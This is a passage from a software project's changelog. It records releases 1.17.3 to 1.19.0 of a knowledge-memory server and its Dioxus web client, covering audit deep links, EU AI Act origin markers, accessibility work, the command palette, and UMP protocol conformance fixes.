The v1.19.0 plan (SSO + deep links + PWA + scale) was audited against the tree
at ship time: **most of it was already shipped** — deep links
(`/review/:proposal_id`, `/recall/:trace_id`, `/subjects/certificate/:dsar_id`)
in v1.16.7, iOS/Android `brain://` intent filters in v1.17.0, the PWA shell
(manifest + service worker + offline shell) in v1.16.7, recall search
debounce in v1.16.7 M6, and the JWT-pair + silent-refresh + principal half of
SSO in v1.16.5. The remaining **testable** delta is shipped here: the audit
panel's filters became URL-addressable. The rest of M1/M3/M4 are documented
ceilings (below).

### Added
- **M2 — `/audit?since=&principal=` deep link**: the `Audit` route now carries
  `since` + `principal` query params (`Route::Audit { since, principal }`),
  threaded into `audit::panel` and seeded into the existing client-side
  `AuditFilter` via a new pure `filter_from_query`. A reviewer can share a
  filtered audit view (e.g. `/audit?principal=alice`) and it opens pre-filtered.
  Pure core + test; all six `Route::Audit` construction sites updated.

### Honest ceilings (carried into v1.20.0)
- **M1 OIDC/SSO is a server-side (v2.x) ceiling, not a client gap.** brain-server
  is a token *validator*, not an OIDC IdP: its `/.well-known/openid-configuration`
  advertises empty `authorization_endpoint`/`token_endpoint`. A real
  authorization-code + PKCE flow needs a new `/auth/authorize` proxy endpoint
  on brain-server (external IdP), which is v2.x work (documented in the v1.16.5/
  v1.16.8 plans + `docs/proxy-sso.md`). The client's JWT-pair mode + silent
  refresh-on-401 + principal pillar (v1.16.5) already consume the JWT half.
- **M4 virtualized lists** need viewport JS (untestable here without `dx serve`);
  the audit panel already paginates server-side (`OFFSET`, v1.16.7).
- **M4 wasm-split lazy panels** remain a Dioxus 0.7.10 ceiling — re-measure after
  Dioxus 0.8-stable (unchanged from v1.18.1).

---



## [1.18.2] — 2026-08-09
### Release notes

- **Origin markers**: every stored item is tagged human, model, or imported (backfilled by source kind); bulk imports never claim human authorship.
- **Improvements:** Exports carry a provenance block: per-row source and origin plus a summary by origin and source; existing field names are unchanged for downstream importers.
- **Improvements:** The public AI notice now advertises origin metadata alongside source and confidence.
### Engineering record


### Server — "Transparency" (EU AI Act Art 50 origin marker + export provenance)

**Unified-version release**: the server ships the Transparency work and the
client is bumped from 1.18.1 to **1.18.2** so both binaries report the same
version (the client carries no new code in this bump — see `[1.18.1]` below for
its last change). Ships the two real accuracy gaps the v1.18.1 Transparency
plan found in COMPLIANCE.md §7 (Round 14 pass): an explicit model-vs-human
`origin` marker, and `/export` provenance that actually carries it. The plan's
M3 (ai-notice / ai-literacy / cop-notice routes + `docs/AI_LITERACY.md`) had
already shipped in v1.16.7/v1.16.8 and is unchanged.

### Added
- **M2 — `knowledge.origin` column** (migration): `TEXT NOT NULL DEFAULT
  'imported'` + `idx_knowledge_origin` index + idempotent backfill by source
  kind (`manual`→`human`, `memory`→`model`, else `imported`). Write-time
  tagging wired into the interactive/assistant paths: `/add` and the propose→
  approve promote set `origin` from the resolved source kind via the pure
  `gate::origin_for_source` helper; `/ingest/memory` writes `model`;
  procedures write `human`. `markdown`/`structured` bulk imports keep the safe
  `imported` default — never claim human authorship for an unknown path.
- **M1 — `/export` provenance block**: per-row `source` + `origin` already
  emitted; now adds `export_format_version: 2` + a `provenance_summary`
  (`total` / `by_origin` / `by_source`) computed across all exported rows. All
  12 v1 field names preserved byte-identical for downstream importers.
- **M3 polish** — `/.well-known/ai-notice` `origin_metadata` now lists
  `origin` alongside `source`/`assertion_kind`/`confidence`.

### Changed
- **COMPLIANCE.md §7** aligned to shipped state (origin column +
  provenance_summary + format-version envelope) and gained an **Enforcement**
  note: Art 50 is enforced by national market surveillance authorities at the
  **€15M / 3% (Art 99(3))** tier — the €35M / 7% figure is Art 99(2) for
  prohibitions + GPAI provider obligations, not Art 50.

### Tests
`origin_for_source_maps_kinds`, `migration_backfills_origin_by_source`,
`export_contains_source_origin_and_provenance_summary` (incl. v1 field-name
regression guard), + `origin` added to `test_migration_schema_contract`.

---




## [1.18.1] — 2026-08-09

### Client — "Harden" (console-history persistence + measured bundle ceiling)

**Client-only** — server + API contract stay at 1.17.5 (zero server changes,
zero schema change). Dioxus 0.7.10. Closes the honest ceilings out of the
v1.17.8/v1.18.0 line where a *real, low-risk, measured* improvement exists.

### Changed
- **M1 — console history: in-memory → persistent + secret-safe** (`src/api.rs`,
  `src/panels/system.rs`). The try-it console's history now survives reload:
  only `redact_for_history`-clean lines are written to web `localStorage` via
  the existing `i18n::pref_save`/`pref_load` seam, capped at the last 100.
  A line whose request body was non-JSON (`line_is_secret`, i.e. an opaque
  token-like payload `redact_for_history` cannot redact) is flagged `secret`
  and held **in-memory only** — never persisted. Pure `persist_history`
  drops secret/empty lines and caps. The `credentials_stay_in_memory` grep
  guard still passes: the raw token-bearing input never touches disk.
- **M4a — client bundle measured, not guessed** (`BENCHMARKS.md`). The Dioxus
  0.7.10 web bundle from `dx bundle`: wasm **3,724,711 B (3.7 MB)** + 60 KB JS
  + 40 KB CSS, recorded as measured facts. wasm-split is **not adopted**
  (experimental in 0.7.10, shell-heavy bundle); tracked for re-measure after
  Dioxus 0.8-stable.

### Deliberate non-changes (honest ceilings, code-grounded)
- **M2 token-minting panel UX** — the UMP panel has no "CLI docs link" to
  replace; minting is correctly CLI-only (no mint endpoint by design). Adding
  untestable UX churn for marginal value was skipped; the security posture is
  unchanged and correct.
- **M3 SSE subscribe** — **no SSE subscribe control exists in the client**; the
  `/ump/subscribe` endpoint is server-side reachability only, so there is
  nothing misleading to rename. A live browser change stream remains v2.x (A2A).
- **M5 native pull-to-refresh / M6 focus-return** — native gesture needs a touch
  platform + `dx serve`; focus-return is `document::eval`-based, both unverifiable
  in this environment (no Android SDK / browser harness). The accessible
  `RefreshButton` and existing focus trap remain.

### Verification
- `cargo test` (client): **76 passed** (was 74; +2 `line_is_secret_*` +
  `persist_history_*`). Clippy `-D warnings` + fmt clean; wasm build clean.
- Server suite untouched (473 baseline — zero server edits).

---



## [1.18.0] — 2026-08-09

### Client — "Compliant" (WCAG 2.2 AA + i18n + privacy hardening pass)

**Client-only** — server + API contract stay at 1.17.5 (zero server changes,
zero schema change). Dioxus 0.7.10. The plan's M3 (i18n) and M4 (privacy)
shipped in v1.16.8/v1.17.0; this release closes the two remaining testable
gaps and formalizes the CI gate.

### Added
- **`?` in-app keyboard help on Review (M1.4).** Pressing `?` (or the new `?`
  toolbar button, `aria-expanded` + `aria-label`) toggles an in-app table
  documenting the A/S/R/J/K shortcuts — the WCAG 3.2.6 consistent-help gap.
  Pure `keyboard_help()` core + i18n keys (`review_help_*`, `en` source; other
  locales fall back via `resolve`). The `?` mapping respects the existing
  WCAG 2.1.4 shortcuts-off toggle.
- **Client CI gate (M2).** New `client-gate` job in `.github/workflows/ci.yml`:
  `cargo fmt --check` + `cargo clippy --all-targets -- -D warnings` +
  `cargo test` + the `wasm32-unknown-unknown` build. The Dioxus client had
  **zero CI coverage** before this; the automated a11y/semantic grep gates
  (`interactive_elements_are_buttons`, `xss_escape_hatch_is_unused`) now run on
  every push/PR.

### Not shipped (documented, not deferred — deliberate ceilings)
- **axe-core browser gate (M2.1)** — needs Playwright + a `dx bundle` + a
  live server + browser download; an operator/tooling step, not runnable in
  this repo's CI surface. Documented in `client/a11y-checklist.md`.
- **Native screen-reader pass (M1.7)** — the human gate; tracked as the
  existing `client/a11y-checklist.md` matrix (VoiceOver/NVDA/TalkBack), an
  operator step.

### Verification
- `cargo test` (client): **74 passed** (was 73; +1
  `question_mark_opens_help_and_table_covers_all_keys`). Clippy `-D warnings`
  + fmt clean; wasm build clean.
- `ci.yml` parses (pyyaml). Server suite untouched (473 baseline — zero server
  edits).

---



## [1.17.9] — 2026-08-09

### Release notes

- **Web client fix:** the UMP capabilities request fired on every render instead of once per mount — a per-keystroke request loop that tripped the server's rate limiter and flipped the client to "reconnecting". Capabilities now load once.

## [1.17.6] — 2026-08-09
### Release notes

- **Bug fixes:** The connect screen now lives at its own address, avoiding a redirect loop with the app shell's connect-first behavior.
- **Command palette v2** — one keyboard surface (Cmd/Ctrl+K) for navigation, lookups, and actions, with grouped results, recent commands, and full keyboard control.
- **Improvements:** Destructive actions like reindex now require an explicit press-Enter-to-confirm step before running.
- **New Overview home page** — status cards for health, snapshot integrity, retention, and protocol conformance, plus a severity-sorted alert list and the top pending items with one-click approve/reject.
- **Improvements:** The new surfaces are translated in all five UI languages (English, German, French, Spanish, Dutch).
### Engineering record


### Client — "Complete" part 1: command palette v2 + Overview

First of the three-part "Complete" (operator console) release line
(`v1.17.6` + `v1.17.7` + `v1.17.8`). **Client-only** — server + API contract
stay at 1.17.5 (zero server changes, zero schema change). Dioxus 0.7.10.

### Added (client)

- **M1 — Command palette v2** (`src/main.rs`): the palette is now a fused
  **nav + lookup + action** surface, not a settings shortcut. `Command` is a
  flat tagged enum (`Navigate` / `Lookup` / `Run` / `SignOut`) with a group
  label + keyword index. Pure cores (`palette_group`, `command_keywords`,
  `palette_lookup`, `remember_recent`, `destructive_action`) are Dioxus-free
  and test-pinned.
  - Grouped results in order **Recent / Go to / Lookup / Run**, capped at 5
    per group (Linear/Raycast convention). Empty needle returns every group;
    a typed needle filters case-insensitively over keywords + labels and hides
    the Recent group.
  - **Recents** persist through the existing `i18n::pref_save`/`pref_load`
    seam (non-secret label list, last 8, dedup + cap).
  - **Keyboard**: `↑`/`↓` navigate the flattened list (group headers are
    labels, not items), `Enter` runs, `Esc` closes, `/` re-focuses the input,
    `Tab`/`Shift+Tab` cycle via the existing hand-rolled `focus_trap`.
  - **Destructive confirm**: selecting a destructive `Run` action (Reindex —
    `destructive_action`) swaps the list to a single "Press Enter to confirm"
    `aria-live` row; `Esc` aborts.
  - **Screen-reader labels** on every row (`aria-label` = `command_label`).
  - M1.5 **single source of truth**: `palette_commands` + the 
    `palette_navigate_covers_every_non_detail_route` guard ensure every
    non-detail route is reachable. The `Lookup`/`Run` row *types* ship now
    (arms wired); live ids/actions arrive with the v1.17.7/v1.17.8 panels.
- **M2 — Overview** (`src/panels/overview.rs`): the decision-first landing
  home at `/` under the AppShell layout. A control room, not a widget dump —
  every card links to its panel, backend stays the source of truth (no client
  cache).
  - **Status row** (≤4 cards): Health (conn dot + status/version), Snapshot
    integrity (`snapshot_count` + green/red dot), Retention posture
    (`enabled` + kind count), Server + UMP (`server.version` +
    `conformance` L2/L3 badge). Each links to its owning panel.
  - **Alert list** (DAR chain: signal + diagnosis + action): auth failures +
    quarantined chunks (existing UiState signals) + stale sources / unresolved
    conflicts / near-duplicates (`/consolidate/propose` counts) + decayed
    chunks (`/decayed`) + tombstones (`/tombstones`). Severity-sorted, empty →
    "no alerts".
  - **Queue preview**: top 5 pending proposals with one-click Approve/Reject
    (mirrors the review panel's `decide`) and a deep link into `/review/:id`.
  - Pure `overview_alerts` core + 3 tests (empty case, severity ordering,
    only-nonzero-sources).
- **api.rs**: 6 new `ApiClient` methods (`snapshot_status`, `retention`,
  `ump_capabilities`, `decayed`, `consolidate_propose`, `tombstones`) + wire
  types mirroring the confirmed handler shapes + 6 wire-contract pin tests.
- **Route + nav**: `Route::Overview {}` at `/`; `Connect` moved to `/connect`
  (outside the AppShell layout, so the shell's connect-first redirect has no
  loop). Overview added as the first rail + tab-bar nav item (via `NavLink`/
  `TabLink`) and to the palette.
- **i18n**: new Overview + palette keys in all five locales
  (`en`/`de`/`fr`/`es`/`nl`), locale-aware `format_number` on alert counts.

### Fixed / Changed (client)

- Connect now routes to `/connect`; after a successful connect it proceeds as
  before (first-connect still lands in Review — unchanged).
- Command palette v1's nav-only `filter_commands` replaced by the grouped
  `palette_lookup`; the old nav-count test updated (6 → 7 targets).

### Tests (client)

59 passed (was 49; +3 overview alerts, +6 api wire-contract pins,
+1 palette route-coverage guard). Clippy `-D warnings` clean, `cargo fmt
--check` clean, wasm build clean.

### Honest ceilings (carried into v1.17.7 / v1.17.8)

- Lookup is instant against **client-held ids only**; a server-backed fuzzy
  lookup is v2.x. Recents are a flat non-secret label list, not deep-linkable
  objects — re-running a recent re-resolves the route/action fresh.
- The `Lookup`/`Run` command rows (and their confirm/destructive handling)
  ship as reserved + wired types; the live ids/actions that construct them
  arrive with the v1.17.7/v1.17.8 panels.
- No RBAC-aware UI (roles land with v1.23.0); the client shows the server's
  403 verbatim. OpenAPI is not parsed client-side (no new dep).
- wasm-split unchanged (Dioxus 0.7.10 ceiling); bundle size grows.

---



## [1.17.8] — 2026-08-09
### Release notes

- **Data & Rights panel** — purge by record ids or owner, portable export (JSON, UMP, or Markdown), a per-kind retention editor, the decayed-content review list, and the deletion registry, all in one place.
- **UMP panel** — protocol capabilities with an integrity badge, remember/recall with filters, and loading plus verifying the audit chain.
- **System panel** — domains, snapshot integrity, the Article 30 register, reindexing, connectors, and source reconciliation.
- **Improvements:** A **try-it console** for issuing raw API requests from the client, with token-bearing bodies stripped from the saved history.
### Engineering record


### Client — "Complete" part 3: Data & Rights + UMP panel + System & Try-it console

Third and final part of the three-part "Complete" operator-console line
(`v1.17.6` + `v1.17.7` + `v1.17.8`). **Client-only** — server + API contract
stay at 1.17.5 (zero server changes, zero schema change). Dioxus 0.7.10.
73 client tests (+7 from 1.17.7).

### Added (client)

- **M5 — Data & Rights panel** (`src/panels/data.rs`): the v1.14 / v1.15
  lifecycle surface — purge (`POST /purge` by comma/space/newline-separated
  ids or an owner), portable export (`GET /export` as JSON / UMP / UMP-Markdown
  via the existing `document::eval` download seam), a per-kind retention editor
  (`GET /retention` → `retention_to_edits` sorted overrides; set a kind+days
  override, one-click `×` clear per kind), the `/decayed` review list, and the
  `/tombstones` deletion-registry. Status region is `role="status"
  aria-live="polite"`.
- **M6 — UMP panel** (`src/panels/ump.rs`): the v1.17.3 wire surface —
  capabilities card (`UmpCapabilities` + pure `ump_integrity_badge`
  badge/label from the `conformance` line), `POST /ump/remember` (JSON body →
  `{ok,id}`), `POST /ump/recall` with kind filter + `max_recall` clamped to
  1..100 (renders the `results` envelope), and `POST /ump/audit` load +
  verify-chain (`ump_audit`/`ump_recall`/`ump_remember` + `UmpRecallResult`/
  `UmpAudit` typed wire types).
- **M7 — System panel** (`src/panels/system.rs`): domains list, snapshot
  integrity, the Art 30 register (`art30()` pretty-JSON), `POST /reindex`
  (`ReindexResult`), connectors list (`ConnectorRow`: `kind · instance / state`)
  + `POST /sources/reconcile` (`ReconcileResult`), and a **Try-it console**
  (`get_raw`/`post_raw`/`delete_raw` + `serialize_request` request-line builder
  + `redact_for_history` so the persisted history never stores a token-bearing
  body).
- **M8 — Route + nav + i18n**: `Route::Data` (`/data`), `Route::Ump` (`/ump`),
  `Route::System` (`/system`) under the AppShell; all three added to sidebar
  rail + mobile tab bar + command palette (nav targets now **12**, guard test
  updated); new `data_*`/`ump_*`/`sys_*`/`nav_*` keys in all five locales
  (each locale now 50 keys, en-completeness test green). **api.rs**: `Clone`
  added to the 10 typed wire structs so `Signal<T>()` call-syntax reads work
  (root cause of the call-syntax failures; consolidate.rs's `Item` already had
  it), `post_raw` made `pub`, pure `parse_purge_result`/`retention_to_edits`/
  `parse_ump_record`/`parse_ump_recall`/`ump_integrity_badge`/
  `serialize_request`/`redact_for_history` cores + wire-contract tests.
- Version 1.17.7 → 1.17.8; CHANGELOG §[1.17.8]; CLIENT_ROADMAP v1.17.8 row →
  Shipped.

### Verification

- `cargo test --manifest-path client/Cargo.toml`: **73 passed** (was 66; +7
  api.rs wire/parse cores).
- `cargo clippy --all-targets --manifest-path client/Cargo.toml -- -D warnings`:
  clean. `cargo fmt --check`: clean. `cargo build` + `cargo build --target
  wasm32-unknown-unknown`: clean.
- Dioxus rsx hazards fixed during the build pass (same class as 1.17.7):
  `let` statements as direct rsx children of `if let` bodies (hoisted all
  signal reads + label computations before `rsx!`); `t()`/placeholders with
  literal braces inside rsx format strings (hoisted to locals, simplified
  `r#"{"query":...}"#` placeholders to plain strings); `Signal<T>()` call
  syntax needs `T: Clone`; `onkeydown` compares `Key::Enter` not `"Enter"`;
  named `move |_|` closures can't coerce to `ListenerCallback` (wrapped as
  `move |_| run_x(())`).

### Ship status

**COMPLETED (code + tests + docs) 2026-08-09**. `./deploy-web.sh` → live
`/app` re-deploy, tag `v1.17.8`, and the GitHub release are operator steps.
No server restart needed (client-only static bundle).



## [1.17.7] — 2026-08-09
### Release notes

- **Bug fixes:** Graph path display rendered a doubled separator between hops; chains now read correctly (A --relation--> B --relation--> C).
- **Bug fixes:** The Create workspace pages no longer render duplicate top-level headings, fixing an accessibility regression.
- **Graph panel** — look up entities and their relations, and run traversals rendered as readable hop chains, with kind filtering.
- **Create workspace** — a single hub for writing: structured/Markdown/memory ingest with up-front JSON validation, a procedure step builder with classification and decision evaluation, and consolidation proposals with one-click apply/undo.
- **Improvements:** New Graph and Create destinations in the sidebar, mobile tab bar, and command palette.
- **Improvements:** All new surfaces translated in the five UI languages.
### Engineering record


### Client — "Complete" part 2: Graph panel + Create workspace

Second of the three-part "Complete" operator-console line (`v1.17.6` +
`v1.17.7` + `v1.17.8`). **Client-only** — server + API contract stay at
1.17.5 (zero server changes, zero schema change). Dioxus 0.7.10. 66 client
tests (+7).

### Added (client)

- **M3 — Graph panel** (`src/panels/graph.rs`): debounced (300 ms) entity
  lookup via `GET /graph/entity/{name}` → typed `EntityView` (traits +
  relations with `from`/`to`/`relation_type`); a traverse card issuing
  `GET /graph/traverse?start=&depth=&kind=&at=&cross_domain=true` → typed
  `TraverseResponse` with `paths` (structured hop chains rendered by the pure
  `render_path` core, `A --relation--> B --relation--> C`) and the flat
  `traversal` rows collapsed in a `<details>` table. `kind` filter validated
  by the pure `kind_is_valid` (exact or `prefix:`-style, matching the v1.7
  server contract); `parse_entity` core + tests.
- **M4 — Create workspace** (`src/panels/create.rs` hub → `ingest.rs` +
  `procedures.rs` + `consolidate.rs`), the v1.14/v1.10 write surface:
  - **Ingest** (`ingest.rs`): three tabs (Structured / Markdown / Memory)
    with real `<button>` tab toggles (aria-pressed), JSON pre-validation
    before send, per-mode result via `parse_ingest_result` /
    `IngestOutcome` (Created / Duplicate / Error).
  - **Procedures** (`procedures.rs`): a step builder (title/body/optional
    is-decision, add-step list) → `POST /procedure` → typed `ProcedureResponse`;
    lists ordered steps via `/procedure/{id}/steps` → `Vec<StepView>`; plus
    the two deterministic helpers: `POST /classify` (typed
    `ClassifyResponse` → category + confidence + matched keywords) and
    `POST /decision/{id}/evaluate` (typed `DecisionOutcome`, vars parsed by
    the pure `parse_decision_vars` core — lenient, non-numeric dropped).
  - **Consolidate** (`consolidate.rs`): `POST /consolidate/propose` →
    typed `ConsolidateProposal`; unresolved contradictions + near-duplicates
    rendered as list items; one-click `POST /consolidate/apply` (supersedes
    link) and `POST /consolidate/undo`, both refresh the proposal list.
- **Routes/nav/i18n**: `Route::Graph{}` at `/graph` and `Route::Create{}`
  at `/create` (under the AppShell); both added to the sidebar rail + tab
  bar + command palette (nav targets now **9**, guard test updated); all
  M3/M4 i18n keys in all five locales (`en`/`de`/`fr`/`es`/`nl`).
- **api.rs**: typed wire structs (`EntityView`/`EntityRel`,
  `TraverseResponse`/`TraversalRow`/`PathChain`/`Hop`, `ProcedureResponse`/
  `ProcedureStepsResponse`/`StepView`, `ClassifyResponse`/`CategoryResult`,
  `DecisionOutcome`, `ApplyResponse`/`UndoResponse`, `ConsolidateProposal`)
  + `impl ApiClient` methods + pure cores (`render_path`, `kind_is_valid`,
  `parse_entity`, `parse_ingest_result`, `parse_decision_vars`) + wire-contract
  tests.

### Fixed (client)

- The palette's `render_path` core emitted a doubled ` --` separator between
  hop chains (`A --e--> B -- --c--> C`) — one `--` was pushed twice; the
  separator is now emitted exactly once, pinning
  `render_path_renders_faithful_chains` to `A --employs--> 2 --ceo_of--> carol`.
- The Create hub's three panels render under ONE focusable `<h1>` (the hub
  owns the `PageTitle`; the nested panels drop theirs) — no duplicate-h1
  a11y regression.
- Dioxus rsx hazards fixed during the build pass: inline `if` in rsx can't
  hold a nested `rsx!` (switched the ingest tab body to a `match` on
  `tab().as_str()`); `#[component]` fn can't be called positionally as a
  plain fn in braces (the `tab_btn` helper is a plain `fn` now); an
  unbraced raw-string placeholder containing `{...}` broke the format-string
  parser (`placeholder: "revenue: 1200"`).

### Verification

- `cargo test --manifest-path client/Cargo.toml`: **66 passed** (was 59 at
  v1.17.6; +7: render_path + wire types + parse cores).
- `cargo clippy --all-targets --manifest-path client/Cargo.toml -- -D warnings`: clean.
- `cargo fmt --check --manifest-path client/Cargo.toml`: clean.
- `cargo build` + `cargo build --target wasm32-unknown-unknown`: clean.

### Ship status: COMPLETED (code + tests + docs) 2026-08-09

`./deploy-web.sh` → live `/app` re-deploy is an operator step. Tag `v1.17.7`
+ GitHub release are operator steps. No server restart needed (client-only
static bundle).

### Honest ceilings (carried into v1.17.8)

- Graph entity relations are the server's snapshot shape; the traverse
  `paths` intermediate hops surface by id unless a name resolves (same as
  the server contract).
- Ingest does client-side JSON pre-validation only; malformed entity/relation
  arrays degrade to empty on the wire (server still validates).
- The palette's `Lookup`/`Run` command rows remain wired-but-reserved; the
  live id/action constructors arrive with v1.17.8's remaining panels.
- wasm-split unchanged (Dioxus 0.7.10 ceiling); bundle size grows.

---



## [1.17.5] — 2026-08-09
### Release notes

- **`brain eval` never worked** — every run failed with a 405 because it called the recall endpoint with the wrong HTTP method; the command now runs and produces scores.
- **Bug fixes:** Eval scores were computed against the wrong matched indices (arbitrary set ordering); indices now match the fixture's documented positions.
- **Bug fixes:** The eval parser now reads both the search and recall response shapes, instead of only the search shape.
- **Improvements:** Release builds must pass automated recall-quality floors before shipping.
- **Improvements:** An automated check asserts the server's declared UMP conformance level.
- **Improvements:** Every tagged release now ships a CycloneDX software bill of materials (SBOM).
- **Improvements:** First published benchmark results for the default configuration (recall@5/10 0.919, MRR 0.905).
### Engineering record


### CLI — "Eval Fix" (`brain eval` + `bench`)

- **Fixed: `brain eval` was dead on arrival — every run returned 405.**
  `run_eval` sent `GET /recall?query=…&k=10`, but `/recall` is a POST-only
  JSON route (`{query, limit}`); the v1.17.1 M3 ship gate and
  `BENCH_RECALL_FLOOR` could never have computed a score. Now POSTs the
  correct body on `/recall` and keeps `GET /search?q=…&k=10` on the search
  leg (`src/bin/brain.rs`).
- **Fixed: judged-index mapping was hash-order arbitrary.** 
  `results_to_doc_indices` mapped result content → DOCS index through a
  `HashSet`, whose `.position()` order is unspecified — recall@k was
  computed against the wrong judged indices. Now matches the DOCS slice
  directly, so indices are the fixture's documented array positions.
- **Fixed: `/recall` response parsing** — the parser only read the
  `results` wrapper (`/search` shape) while `/recall` returns `hits`; both
  shapes now parse (pinned by a new brain-bin test).
- **CI (round-21 gaps):** two new jobs — `ump-conformance` boots a scratch
  keyed instance and asserts the reference suite's `UMP 1.0 / L3` badge
  line (the runner exits 0 for any level ≥ L1, so the gate checks the text);
  `recall-gate` seeds the frozen 10-doc corpus and enforces
  `--floor r5=0.85 --floor r10=0.85 --floor mrr=0.85` with `pipefail`.
- **SBOM:** the tag release workflow now generates a CycloneDX SBOM via the
  existing `scripts/sbom.sh` (cargo-cyclonedx from Cargo.lock) and ships it
  in `dist/` alongside the binaries (EU CRA / OWASP A03:2025).
- **Benchmarks:** first honest row in `BENCHMARKS.md` — the frozen 37-query
  smoke-set run on the default profile (r@5 0.919, r@10 0.919, nDCG@10
  0.911, MRR 0.905). Smoke set only; parity rows stay `PENDING` per the
  protocol (≥100 judged queries on target hardware incl. 4 GB ARM).
- Fixture doc-count corrected (32 → 37 judged queries).

---



## [1.17.4] — 2026-08-09
### Release notes

- **Record identities were mis-derived** — the did:key encoding was rejected by reference UMP implementations; it is now spec-correct, and records signed by the previous release still verify.
- **Bug fixes:** Looking up records by their content-addressed id on the UMP endpoints returned 404; urn-form ids now resolve everywhere.
- **Bug fixes:** UMP imports rejected requests that omitted a protocol version field; a missing version now defaults to 1.0.
- **Bug fixes:** Provenance and consent metadata was silently dropped on import; it is now stored and re-emitted with every record.
- **Improvements:** The record integrity block now uses the reference format (content hash, signature, signer), so third-party UMP tools byte-match brain-server records.
- **Improvements:** Revising a record now marks the prior one with its end-of-validity time and a link to its successor.
- **Improvements:** Forget now clearly reports whether content was erased or tombstoned, and feedback returns the response conforming tools expect.
### Engineering record


### Server — "UMP Conformance" (wire fixes)

Fixes every defect a byte-level review of the reference conformance suite
(`github.com/edihasaj/universal-memory-protocol` `conformance.ts`) surfaced
against the v1.17.3 implementation, so the reference runner scores the full
L1–L3 set. **Breaking change:** the emitted `integrity` block and the
`did:key` identity changed shape (below) — records signed by a v1.17.3 peer
still verify (dual-read), but new signatures use the reference format.

- **did:key bug fixed (breaking)** — `did_key_from_ed25519` used a 33-byte
  bare-`0xed` multicodec prefix; the reference `didKeyFromPublicKey` prefixes
  the two-byte `0xed 0x01` varint (34 bytes), and `publicKeyFromDidKey`
  rejects anything else. Old output `did:key:z2De…`; correct form
  `did:key:z6Mk…`. The operator CLI + server identity now agree with the
  reference (vector pinned: RFC 8032 vector-1 pk → `z6MktwupdmLXVVqTzCw4i46
  r4uGyosGXRnR3XjN5x1fTDDgQ`).
- **Integrity block → reference §2.8 format (breaking)** — `{algo, hash,
  key, sig}` replaced by `{content_hash: "blake3:<base32>", signature:
  "ed25519:<std-base64>", signer: <did:key>}`. The content hash covers the
  canonical record minus `integrity` only (`id` stays inside), computed with
  the reference's JS-flavor canonicalization (integral floats serialize as
  `1`, not `1.0`; U+2028/U+2029 escaped) so the reference `verify()` byte-
  matches; the signature is Ed25519 over BLAKE3 of the `content_hash` STRING.
  `verify_record` dual-reads the legacy v1.17.3 shape. **Fix found by the
  live reference run:** the emitted signature initially carried bare base64 —
  the reference `verifyHash` requires the `ed25519:` prefix (`/^ed25519:(.+)$/`),
  so `L3.signed` failed until the emit gained the prefix (verify accepts both
  forms). Pinned by assertions in `emit_record_signed_and_verified_with_
  operator_key` + `ump_suite_parity_l1_to_l3`.
- **`from_ump` version gate lenient** — op requests carry no `ump` field
  (the suite sends none); absent now defaults to `1.0` (only an explicit
  unknown major is rejected).
- **`provenance` + `consent` carried** — stored in `UmpMeta`, re-emitted on
  every record (the suite's remember includes `provenance`; it previously
  round-tripped nowhere).
- **`superseded_by` on the prior record** — `GET /ump/memory/{id}` and
  `/ump/recall` now resolve `supersedes` evidence links and emit the
  successor's content-addressed urn; the revised record drops the carried
  `origin` so its own id resolves to a fresh urn (L2 bi-temporal: prior has
  `time.valid_to` + a non-empty `superseded_by` pointing at the revision).
- **id resolution by urn** — `/ump/memory/{id}`, `/ump/revise`,
  `/ump/forget`, `/ump/feedback` accept the content-addressed `urn:ump:…`
  form (resolved via the `ump_id` column, which `KNOWLEDGE_ROW_COLS` now
  loads; it was previously missing so ids fell back to the xxh3-shaped
  `urn:ump:<content_hash>` form and urn lookups 404'd).
- **`/ump/feedback` → `{ok: true}`** (the suite asserts it); `session`
  accepted and persisted; unknown ids 404.
- **`/ump/forget`** reports `erased` for the hard path, `tombstoned` for the
  soft path.
- **Ops** — the launchd plist gains `BRAIN_UMP_KEY_DIR`; wiki + keygen docs
  use the correct `did:key` form; `COMPLIANCE.md` cites Regulation (EU)
  2026/1744 (GPAI obligations live 2026-08-02, watermarking 2026-12-02) with
  the provenance-not-watermarking posture.

**New test:** `ump_suite_parity_l1_to_l3` (`#[ignore]`d, model2vec-weights
precedent) — walks the reference suite's exact requests end-to-end against a
keyed instance: capabilities envelope, remember (procedural + provenance) →
`{id, result:"created"}`, get-by-urn with a reference-shape signed integrity
block, recall (urn id + `signals` object), revise → `{supersedes:[urn]}`,
prior `time.valid_to` + `superseded_by` pointing at the new urn, forget →
`tombstoned`, validation → 400 `invalid_record`, feedback → `{ok:true}`.

### Verification
- `cargo test --features bench,migrate`: 473 bin + 70 lib + 9 + 8 + 7 + 3×2
  green; `--ignored` suite-parity test green. clippy `-D warnings` + fmt clean.
- **External reference run (live)**: `@universalmemoryprotocol/core` 1.0.0
  `ump-conformance` against a throwaway keyed instance (fresh DB + operator
  key + `AUTH_TOKEN`): **13/13 checks, `UMP 1.0 / L3`** — L1 capabilities
  (ump 1.0, 5 kinds), remember `created`, get, recall (urn id + `signals`),
  L2 revise + bi-temporal `valid_to` + superseded, forget `tombstoned`,
  validation 400 `invalid_record`, L3 discovery, **signed (reference
  `verify()` byte-matches + Ed25519 verifies)**, feedback `{ok:true}`,
  capability tokens (no-token 401, token 200), subscribe SSE. Reruns against
  a persistent DB report `merged` on L1.remember by design (content dedup) —
  the suite assumes a fresh store, same as the reference `ump-serve`.

---



## [1.17.3] — 2026-08-09
### Release notes

- **Bug fixes:** Exporting from a store with no records failed with a fatal error; empty stores now export cleanly.
- **Full UMP 1.0 memory API** — capabilities handshake, remember, integrity-verified get, recall with relevance signals, revise, forget, feedback, audit, and a subscription change feed.
- **Improvements:** The same surface is exposed as MCP tools (`ump.*`) for agent integrations, with token pass-through.
- **Portable record files** — export and import memories as UMP Markdown or JSON via the CLI, round-trip lossless.
- **Operator signing keys and capability tokens** — generate an Ed25519 identity key, and grant scoped, expiring read/write/export tokens enforced per endpoint.
### Engineering record


### Server — "UMP Rollout"

The UMP 1.0 rollout on the v1.17.2 wire-conformance base: the spec's §4.2
HTTP ops, §4.1 MCP tools, §4.3 file binding, and §5 identity + capability
tokens. Conformance claim: **UMP 1.0 / L3** (self-attested; §8-compliant
unknown-major rejection + 0.1-import normalization already shipped in
v1.17.1/1.17.2). `GET /ump/capabilities` (and the `/.well-known/ump.json`
discovery doc) report `conformance: "L3"` when an operator key is configured,
`"L2"` otherwise.

- **M2 — HTTP ops (`/ump/*`, spec §4.2)** — new `src/handlers/ump_ops.rs`
  (the codec stays in `ump.rs`): `GET /ump/capabilities` (§3.1 handshake:
  `server`, `ump: "1.0"`, `conformance`, `kinds`, `bindings:
  ["http","mcp","file"]`, `retrieval_signals`, `max_recall: 50`,
